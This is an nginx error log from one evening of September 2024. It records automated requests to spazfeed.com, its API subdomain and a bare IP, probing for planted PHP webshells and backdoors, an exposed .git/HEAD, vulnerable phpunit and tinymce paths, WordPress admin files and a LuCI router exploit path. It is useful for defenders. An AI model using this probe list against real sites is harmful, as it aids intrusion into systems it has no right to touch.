2024/09/02 20:28:30 [error] 217#217: *3651 open() "/var/www/html/wp-content/admin.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /wp-content/admin.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3673 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/file.php" failed (2: No such file or directory), client: 162.158.130.63, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/file.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3661 open() "/var/www/html/include.php" failed (2: No such file or directory), client: 188.114.102.197, server: localhost-nginx-proxy-manager, request: "GET /include.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3659 open() "/var/www/html/web.php" failed (2: No such file or directory), client: 162.158.129.196, server: localhost-nginx-proxy-manager, request: "GET /web.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3665 open() "/var/www/html/wp-content/uploads/about.php" failed (2: No such file or directory), client: 162.158.129.222, server: localhost-nginx-proxy-manager, request: "GET /wp-content/uploads/about.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3658 open() "/var/www/html/configure.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /configure.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3664 open() "/var/www/html/.well-known/pki-validation/moon.php" failed (2: No such file or directory), client: 162.158.129.107, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/moon.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3652 open() "/var/www/html/user-info.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /user-info.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:53 [error] 217#217: *3695 open() "/var/www/html/wp-includes/js/tinymce/wp-tinymce.php" failed (2: No such file or directory), client: 172.71.152.54, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/js/tinymce/wp-tinymce.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:53 [error] 217#217: *3696 open() "/var/www/html/wp-tinymce.php" failed (2: No such file or directory), client: 172.69.166.96, server: localhost-nginx-proxy-manager, request: "GET /wp-tinymce.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:53 [error] 217#217: *3697 open() "/var/www/html/mar.php" failed (2: No such file or directory), client: 172.69.166.50, server: localhost-nginx-proxy-manager, request: "GET /mar.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:54 [error] 217#217: *3698 open() "/var/www/html/mah.php" failed (2: No such file or directory), client: 162.158.170.77, server: localhost-nginx-proxy-manager, request: "GET /mah.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:54 [error] 217#217: *3699 open() "/var/www/html/admin.php" failed (2: No such file or directory), client: 172.70.188.56, server: localhost-nginx-proxy-manager, request: "GET /admin.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:55 [error] 217#217: *3700 open() "/var/www/html/about.php" failed (2: No such file or directory), client: 162.158.106.128, server: localhost-nginx-proxy-manager, request: "GET /about.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:55 [error] 217#217: *3701 open() "/var/www/html/db.php" failed (2: No such file or directory), client: 172.70.142.243, server: localhost-nginx-proxy-manager, request: "GET /db.php?u HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:55 [error] 217#217: *3702 open() "/var/www/html/crop.php" failed (2: No such file or directory), client: 172.71.81.196, server: localhost-nginx-proxy-manager, request: "GET /crop.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:56 [error] 217#217: *3703 open() "/var/www/html/dropdown.php" failed (2: No such file or directory), client: 172.71.124.36, server: localhost-nginx-proxy-manager, request: "GET /dropdown.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:57 [error] 217#217: *3704 open() "/var/www/html/randkeyword.php" failed (2: No such file or directory), client: 162.158.162.93, server: localhost-nginx-proxy-manager, request: "GET /randkeyword.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:57 [error] 217#217: *3702 open() "/var/www/html/upload.php" failed (2: No such file or directory), client: 172.71.81.196, server: localhost-nginx-proxy-manager, request: "GET /upload.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:58 [error] 217#217: *3695 open() "/var/www/html/about.php" failed (2: No such file or directory), client: 172.71.152.54, server: localhost-nginx-proxy-manager, request: "GET /about.php?p= HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:58 [error] 217#217: *3705 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 172.71.124.138, server: localhost-nginx-proxy-manager, request: "GET /index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:58 [error] 217#217: *3706 open() "/var/www/html/autoload_classmap.php" failed (2: No such file or directory), client: 172.70.92.160, server: localhost-nginx-proxy-manager, request: "GET /autoload_classmap.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:59 [error] 217#217: *3707 open() "/var/www/html/randkeyword.PhP7" failed (2: No such file or directory), client: 162.158.189.140, server: localhost-nginx-proxy-manager, request: "GET /randkeyword.PhP7 HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:25:59 [error] 217#217: *3708 open() "/var/www/html/404.php" failed (2: No such file or directory), client: 108.162.226.194, server: localhost-nginx-proxy-manager, request: "GET /404.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:00 [error] 217#217: *3709 open() "/var/www/html/content.php" failed (2: No such file or directory), client: 172.70.142.219, server: localhost-nginx-proxy-manager, request: "GET /content.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:00 [error] 217#217: *3710 open() "/var/www/html/worksec.php" failed (2: No such file or directory), client: 108.162.226.134, server: localhost-nginx-proxy-manager, request: "GET /worksec.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:01 [error] 217#217: *3711 open() "/var/www/html/.well-known/pki-validation/index.php" failed (2: No such file or directory), client: 172.70.143.29, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:05 [error] 217#217: *3703 open() "/var/www/html/xmrlpc.php" failed (2: No such file or directory), client: 172.71.124.36, server: localhost-nginx-proxy-manager, request: "GET /xmrlpc.php?p= HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:05 [error] 217#217: *3705 open() "/var/www/html/up.php" failed (2: No such file or directory), client: 172.71.124.138, server: localhost-nginx-proxy-manager, request: "GET /up.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:05 [error] 217#217: *3712 open() "/var/www/html/wp-admin/images/index.php" failed (2: No such file or directory), client: 108.162.227.22, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/images/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:07 [error] 217#217: *3713 open() "/var/www/html/wp-admin/js/index.php" failed (2: No such file or directory), client: 172.70.142.204, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/js/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:07 [error] 217#217: *3714 open() "/var/www/html/wp-blogz.php" failed (2: No such file or directory), client: 172.71.124.101, server: localhost-nginx-proxy-manager, request: "GET /wp-blogz.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:08 [error] 217#217: *3715 open() "/var/www/html/cong.php" failed (2: No such file or directory), client: 172.70.189.30, server: localhost-nginx-proxy-manager, request: "GET /cong.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:08 [error] 217#217: *3702 open() "/var/www/html/about/function.php" failed (2: No such file or directory), client: 172.71.81.196, server: localhost-nginx-proxy-manager, request: "GET /about/function.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:08 [error] 217#217: *3702 open() "/var/www/html/wp-content/uploads/2023/05/404.php" failed (2: No such file or directory), client: 172.71.81.196, server: localhost-nginx-proxy-manager, request: "GET /wp-content/uploads/2023/05/404.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:08 [error] 217#217: *3706 open() "/var/www/html/wp-content/themes/pridmag/db.php" failed (2: No such file or directory), client: 172.70.92.160, server: localhost-nginx-proxy-manager, request: "GET /wp-content/themes/pridmag/db.php?u HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:09 [error] 217#217: *3716 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/upfile.php" failed (2: No such file or directory), client: 172.70.147.63, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/upfile.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:09 [error] 217#217: *3717 open() "/var/www/html/wp-admin/maint/index.php" failed (2: No such file or directory), client: 162.158.189.67, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/maint/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:09 [error] 217#217: *3714 open() "/var/www/html/wp-login.php" failed (2: No such file or directory), client: 172.71.124.101, server: localhost-nginx-proxy-manager, request: "GET /wp-login.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:21 [error] 217#217: *3718 "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/index.html" is not found (2: No such file or directory), client: 172.70.189.177, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:22 [error] 217#217: *3719 "/var/www/html/.tmb/index.html" is not found (2: No such file or directory), client: 172.70.143.122, server: localhost-nginx-proxy-manager, request: "GET /.tmb/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:23 [error] 217#217: *3696 "/var/www/html/.wp-cli/index.html" is not found (2: No such file or directory), client: 172.69.166.96, server: localhost-nginx-proxy-manager, request: "GET /.wp-cli/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:23 [error] 217#217: *3720 "/var/www/html/wordpress/index.html" is not found (2: No such file or directory), client: 108.162.226.187, server: localhost-nginx-proxy-manager, request: "GET /wordpress/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:25 [error] 217#217: *3721 "/var/www/html/v2/index.html" is not found (2: No such file or directory), client: 172.70.143.210, server: localhost-nginx-proxy-manager, request: "GET /v2/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:25 [error] 217#217: *3722 "/var/www/html/backend/index.html" is not found (2: No such file or directory), client: 108.162.227.29, server: localhost-nginx-proxy-manager, request: "GET /backend/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:25 [error] 217#217: *3705 "/var/www/html/assets/lib/tinymce/plugins/textpattern/index.html" is not found (2: No such file or directory), client: 172.71.124.138, server: localhost-nginx-proxy-manager, request: "GET /assets/lib/tinymce/plugins/textpattern/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:25 [error] 217#217: *3723 "/var/www/html/lib/tinymce/plugins/textpattern/index.html" is not found (2: No such file or directory), client: 162.158.170.4, server: localhost-nginx-proxy-manager, request: "GET /lib/tinymce/plugins/textpattern/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:26 [error] 217#217: *3724 "/var/www/html/assets/contao/index.html" is not found (2: No such file or directory), client: 162.158.163.48, server: localhost-nginx-proxy-manager, request: "GET /assets/contao/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:26 [error] 217#217: *3718 "/var/www/html/assets/contao/css/index.html" is not found (2: No such file or directory), client: 172.70.189.177, server: localhost-nginx-proxy-manager, request: "GET /assets/contao/css/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:34 [error] 217#217: *3725 "/var/www/html/assets/contao/images/index.html" is not found (2: No such file or directory), client: 162.158.106.149, server: localhost-nginx-proxy-manager, request: "GET /assets/contao/images/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:34 [error] 217#217: *3726 "/var/www/html/assets/contao/js/index.html" is not found (2: No such file or directory), client: 172.70.189.54, server: localhost-nginx-proxy-manager, request: "GET /assets/contao/js/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:35 [error] 217#217: *3727 "/var/www/html/wp-includes/css/dist/edit-site/index.html" is not found (2: No such file or directory), client: 162.158.106.74, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/dist/edit-site/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:35 [error] 217#217: *3728 "/var/www/html/wp-includes/css/dist/components/index.html" is not found (2: No such file or directory), client: 172.71.82.103, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/dist/components/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:36 [error] 217#217: *3729 "/var/www/html/wp-includes/css/dist/editor/index.html" is not found (2: No such file or directory), client: 172.70.189.96, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/dist/editor/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:36 [error] 217#217: *3730 "/var/www/html/wp-includes/css/dist/block-library/index.html" is not found (2: No such file or directory), client: 172.70.143.201, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/dist/block-library/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:36 [error] 217#217: *3702 "/var/www/html/wp-includes/css/dist/commands/index.html" is not found (2: No such file or directory), client: 172.71.81.196, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/dist/commands/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:44 [error] 217#217: *3731 "/var/www/html/wp-includes/css/dist/preferences/index.html" is not found (2: No such file or directory), client: 162.158.106.137, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/dist/preferences/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:51 [error] 217#217: *3732 "/var/www/html/wp-includes/ID3/index.html" is not found (2: No such file or directory), client: 162.158.190.69, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/ID3/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:51 [error] 217#217: *3703 "/var/www/html/wp-includes/Requests/index.html" is not found (2: No such file or directory), client: 172.71.124.36, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/Requests/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:52 [error] 217#217: *3733 "/var/www/html/wp-includes/SimplePie/index.html" is not found (2: No such file or directory), client: 172.70.143.15, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/SimplePie/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:26:52 [error] 217#217: *3734 "/var/www/html/wp-includes/Text/index.html" is not found (2: No such file or directory), client: 172.70.92.201, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/Text/ HTTP/1.1", host: "spazfeed.com"
2024/09/02 21:54:53 [error] 217#217: *3749 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 45.148.10.251, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale HTTP/1.1", host: "161.97.134.50:80"
2024/09/02 21:56:59 [error] 217#217: *3751 open() "/var/www/html/.git/HEAD" failed (2: No such file or directory), client: 3.250.94.198, server: localhost-nginx-proxy-manager, request: "GET /.git/HEAD HTTP/1.1", host: "161.97.134.50"
2024/09/02 21:58:36 [error] 217#217: *3752 open() "/var/www/html/chosen.php" failed (2: No such file or directory), client: 162.158.63.155, server: localhost-nginx-proxy-manager, request: "GET /chosen.php?p= HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:38 [error] 217#217: *3753 open() "/var/www/html/ova.php" failed (2: No such file or directory), client: 162.158.154.148, server: localhost-nginx-proxy-manager, request: "GET /ova.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:39 [error] 217#217: *3754 open() "/var/www/html/wp-GhD3xj.php" failed (2: No such file or directory), client: 172.70.230.39, server: localhost-nginx-proxy-manager, request: "GET /wp-GhD3xj.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:41 [error] 217#217: *3755 open() "/var/www/html/wp-admin/network/wp-GhD3xj.php" failed (2: No such file or directory), client: 162.158.155.235, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/network/wp-GhD3xj.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:42 [error] 217#217: *3756 open() "/var/www/html/nf_tracking.php" failed (2: No such file or directory), client: 172.70.114.245, server: localhost-nginx-proxy-manager, request: "GET /nf_tracking.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:42 [error] 217#217: *3757 open() "/var/www/html/css/index.php" failed (2: No such file or directory), client: 172.70.111.76, server: localhost-nginx-proxy-manager, request: "GET /css/index.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:43 [error] 217#217: *3758 open() "/var/www/html/mah.php" failed (2: No such file or directory), client: 172.70.114.33, server: localhost-nginx-proxy-manager, request: "GET /mah.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:44 [error] 217#217: *3759 open() "/var/www/html/simple.php" failed (2: No such file or directory), client: 162.158.158.246, server: localhost-nginx-proxy-manager, request: "GET /simple.php HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:45 [error] 217#217: *3760 "/var/www/html/wp-includes/ID3/index.html" is not found (2: No such file or directory), client: 172.70.110.247, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/ID3/ HTTP/1.1", host: "api.spazfeed.com"
2024/09/02 21:58:45 [error] 217#217: *3761 open() "/var/www/html/bless.php" failed (2: No such file or directory), client: 172.70.114.248, server: localhost-nginx-proxy-manager, request: "GET /bless.php HTTP/1.1", host: "api.spazfeed.com"
